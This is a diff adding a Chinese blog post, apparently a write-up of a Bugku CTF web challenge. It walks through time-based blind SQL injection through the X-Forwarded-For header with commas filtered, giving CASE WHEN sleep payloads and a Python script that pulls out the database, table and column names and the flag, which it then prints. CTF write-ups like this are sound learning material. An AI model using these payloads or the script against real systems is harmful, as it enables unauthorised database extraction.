@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>insert into | dWm2&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="bugku,sql注入">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="观察题目   可以看到注入点应该在http头的x-forwarded-for上   这里还把‘，’过滤了   因为把，过滤了 if是用不了这里用select case when..then..else..end代替substr也用不了 但是可以用 from 1 for 1代替为了节约时间，可以先手工查字段长度这里以database()做示范: x-forwarded-for:1’ and ca">
+<meta name="keywords" content="bugku,sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="insert into">
+<meta property="og:url" content="http://dddwmr.github.io/2019/08/24/insert into/index.html">
+<meta property="og:site_name" content="dWm2&#39;s Blog">
+<meta property="og:description" content="观察题目   可以看到注入点应该在http头的x-forwarded-for上   这里还把‘，’过滤了   因为把，过滤了 if是用不了这里用select case when..then..else..end代替substr也用不了 但是可以用 from 1 for 1代替为了节约时间，可以先手工查字段长度这里以database()做示范: x-forwarded-for:1’ and ca">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://dddwmr.github.io/2019/08/24/insert%20into/1-01.png">
+<meta property="og:image" content="http://dddwmr.github.io/2019/08/24/insert%20into/1-02.png">
+<meta property="og:image" content="http://dddwmr.github.io/2019/08/24/insert%20into/1-03.png">
+<meta property="og:image" content="http://dddwmr.github.io/2019/08/24/insert%20into/1-04.png">
+<meta property="og:image" content="http://dddwmr.github.io/2019/08/24/insert%20into/1-05.png">
+<meta property="og:image" content="http://dddwmr.github.io/2019/08/24/insert%20into/1-06.png">
+<meta property="og:updated_time" content="2019-11-13T15:40:52.609Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="insert into">
+<meta name="twitter:description" content="观察题目   可以看到注入点应该在http头的x-forwarded-for上   这里还把‘，’过滤了   因为把，过滤了 if是用不了这里用select case when..then..else..end代替substr也用不了 但是可以用 from 1 for 1代替为了节约时间，可以先手工查字段长度这里以database()做示范: x-forwarded-for:1’ and ca">
+<meta name="twitter:image" content="http://dddwmr.github.io/2019/08/24/insert%20into/1-01.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="dWm2&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">dWm2</h5>
+          
+            <div id="mymotto" class="motto"></div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/dddwmr" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">insert into</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+<article id="post-insert into"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">insert into</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-08-24 00:00:00" datetime="2019-08-24T00:00:00.000Z"  itemprop="datePublished">2019-08-24</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctfweb/">ctfweb</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">3</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <img src="/2019/08/24/insert%20into/1-01.png" title="image">
+
+<p>观察题目</p>
+<img src="/2019/08/24/insert%20into/1-02.png" title="image">
+
+<p>可以看到注入点应该在http头的x-forwarded-for上</p>
+<img src="/2019/08/24/insert%20into/1-03.png" title="image">
+
+<p>这里还把‘，’过滤了</p>
+<img src="/2019/08/24/insert%20into/1-04.png" title="image">
+
+<p>因为把，过滤了 if是用不了<br>这里用select case when..then..else..end代替<br>substr也用不了 但是可以用 from 1 for 1代替<br>为了节约时间，可以先手工查字段长度<br>这里以database()做示范:</p>
+<p><strong>x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a</strong></p>
+<img src="/2019/08/24/insert%20into/1-05.png" title="image">
+
+<p>可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：<br><strong>x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a</strong></p>
+<img src="/2019/08/24/insert%20into/1-06.png" title="image">
+
+<p>当然转成ascii码用二分法更有效率<br>但为了更加方便 这里写一个脚本</p>
+<pre class=" language-python"><code class="language-python"> !<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python
+
+<span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token punctuation">:</span> UTF<span class="token number">-8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+mystring <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token comment" spellcheck="true">#所有字母和数字的集合</span>
+url<span class="token operator">=</span><span class="token string">'http://123.206.87.240:8002/web15/'</span>
+<span class="token comment" spellcheck="true">#查库名</span>
+data <span class="token operator">=</span> <span class="token string">"127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1"</span>  <span class="token comment" spellcheck="true">#这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15</span>
+<span class="token comment" spellcheck="true">#查表名</span>
+data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span><span class="token comment" spellcheck="true">#查出来时clineip和flag</span>
+<span class="token comment" spellcheck="true">#查字段名</span>
+data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and     table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span>
+<span class="token comment" spellcheck="true">#查出来是 flag</span>
+<span class="token comment" spellcheck="true">#查内容</span>
+data<span class="token operator">=</span> <span class="token string">"1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 "</span>
+flag <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> mystring<span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+          headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'x-forwarded-for'</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#format格式化输出，把查到的str的每一字符依次赋到{0}里去</span>
+          res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一旦延时超过3s，继续向下执行代码</span>
+        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#跳到这里执行，得到所求</span>
+          flag <span class="token operator">+=</span> j
+          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+          <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The final flag:'</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre>
+<p>由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}<br>（最好每次只开一个运行 不然出错概率太大）</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-11-13T15:40:52.609Z" itemprop="dateUpdated">2019-11-13 15:40:52</time>
+</span>
+
+
+        
+        原文链接：<a href="/2019/08/24/insert into/" target="_blank" rel="external">http://dddwmr.github.io/2019/08/24/insert into/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='http://dddwmr.github.io'">
+            <img src="/img/avatar.jpg" alt="dWm2">
+            <a>dWm2</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bugku/">bugku</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dddwmr.github.io/2019/08/24/insert into/&title=《insert into》 — dWm2's Blog&pic=http://dddwmr.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dddwmr.github.io/2019/08/24/insert into/&title=《insert into》 — dWm2's Blog&source=彩笔" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://dddwmr.github.io/2019/08/24/insert into/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《insert into》 — dWm2's Blog&url=http://dddwmr.github.io/2019/08/24/insert into/&via=http://dddwmr.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://dddwmr.github.io/2019/08/24/insert into/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/10/21/BUUCTFwp/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：BUUCTF WEB wp
+        </h4>
+      </a>
+    </div>
+  
+
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2017
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="http://dddwmr.github.io">tomotoes.com</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dddwmr.github.io/2019/08/24/insert into/&title=《insert into》 — dWm2's Blog&pic=http://dddwmr.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dddwmr.github.io/2019/08/24/insert into/&title=《insert into》 — dWm2's Blog&source=彩笔" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://dddwmr.github.io/2019/08/24/insert into/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《insert into》 — dWm2's Blog&url=http://dddwmr.github.io/2019/08/24/insert into/&via=http://dddwmr.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://dddwmr.github.io/2019/08/24/insert into/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLklEQVR42u3aS27DMAxFUe9/0+4CAquXj4kBUVejIvFHJwOWpHhdeN0fK/v86cnrT762ZMiQsS3jXq7Pa9avX2+LX8P3JkOGjHMY61BINk22Ug24/C4ZMmTIyNLBdXjlz5QhQ4aMjEGSQr51noDKkCHjZAYpYkkh2gm4L9XiMmTI2JDBu+7v//2T8w0ZMmRsxbiLq1/ckh+ovCsZMmSMZvAAR1I93jjjKSMviWXIkHEyoxz4cJDNGnAoe5UhQ8YgRifwVctOkm7yQ4LHDFeGDBnjGNkWsxKXjIJlpa8MGTJmM/qvqX7b/70fu4YyZMg4gNEvOLMBsur1YZYqQ4aMbRm8c9W/PgvZBClDhowTGLwRRj7nhwrkELRQ4sqQIWMoIwuvV2MRPG/ztf5LyJAhYxPGuozMmmhZOOaFcbkilyFDxggGb9OTBJE34MhzysMWMmTIGMfgN2fjEQTJW3KFfFOGDBmDGDwgdgYyyv2/LE2UIUPGAQyekFUbZ/1DynJuK0OGjNGMakO/2krjVfX6yf8MW8iQIWMog4dgMqSFQiQYtgiLWBkyZIxmdJK86qFj/70yZMg4gXEXV+c4oZr88eRShgwZsxl8lRM1PE6RHVRk+5EhQ8a+jGwkKzsE5eVxebpNhgwZBzDeHMIgd4WlrAwZMmQU08T+WBgJxDJkyJDxtTo4OjAoBHEZMmQcwKgeBmRJIX8yH1OTIUPGCYysxZ+NWYStNHwsKkOGjHGMP/g02xmWcDheAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2019/10/11");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+    elasticText({
+        id: "mymotto",
+        duration: 100,
+        effact: "easeOut",
+        content: ""
+    });
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "dWm2");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
